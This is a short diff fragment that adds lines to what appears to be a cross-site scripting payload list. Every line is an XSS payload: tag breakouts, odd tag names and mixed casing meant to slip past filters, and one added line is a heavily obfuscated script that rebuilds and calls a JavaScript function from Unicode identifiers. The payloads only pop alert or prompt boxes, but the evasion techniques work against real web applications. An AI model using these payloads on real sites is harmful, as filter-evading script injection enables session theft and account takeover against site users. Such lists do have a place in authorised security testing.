@@ -1,3 +1,5 @@
+‘>alert(154)</script><script/154=’;;;;;;;
+<ScriPt>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</sCripT>
 <script%20TEST>alert(1)</script%20TESTTEST>
 <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
 "><script akdk> prompt(document.domain)</script akdk>
